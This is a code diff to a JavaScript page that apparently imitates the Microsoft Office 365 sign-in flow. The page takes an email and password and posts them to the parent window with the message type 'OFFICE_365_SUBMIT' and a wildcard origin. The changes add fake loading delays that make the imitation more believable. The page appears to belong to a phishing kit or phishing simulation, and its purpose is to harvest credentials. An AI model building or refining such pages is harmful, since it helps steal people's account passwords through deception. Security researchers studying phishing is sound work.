@@ -324,14 +324,20 @@
         }
       });
 
-      nextBtn.addEventListener('click', function () {
+      nextBtn.addEventListener('click', async function () {
         if (emailInput.value.trim() !== '') {
-          userEmail = emailInput.value.trim();
-          displayEmail.textContent = userEmail;
-          emailView.classList.add('hidden');
-          optionsBox.classList.add('hidden');
-          passwordView.classList.remove('hidden');
-          passwordInput.focus();
+          nextBtn.disabled = true;
+          try {
+            await new Promise(function (r) { setTimeout(r, 800); });
+            userEmail = emailInput.value.trim();
+            displayEmail.textContent = userEmail;
+            emailView.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            passwordView.classList.remove('hidden');
+            passwordInput.focus();
+          } finally {
+            nextBtn.disabled = false;
+          }
         } else {
           emailInput.focus();
         }
@@ -345,14 +351,20 @@
         passwordErrorContainer.innerHTML = '';
       });
 
-      signInBtn.addEventListener('click', function () {
+      signInBtn.addEventListener('click', async function () {
         const password = passwordInput.value.trim();
         passwordErrorContainer.innerHTML = '';
         if (password !== '') {
-          window.parent.postMessage({
-            type: 'OFFICE_365_SUBMIT',
-            payload: { email: userEmail, password: password }
-          }, '*');
+          signInBtn.disabled = true;
+          try {
+            await new Promise(function (r) { setTimeout(r, 1200); });
+            window.parent.postMessage({
+              type: 'OFFICE_365_SUBMIT',
+              payload: { email: userEmail, password: password }
+            }, '*');
+          } finally {
+            signInBtn.disabled = false;
+          }
         } else {
           passwordInput.focus();
         }
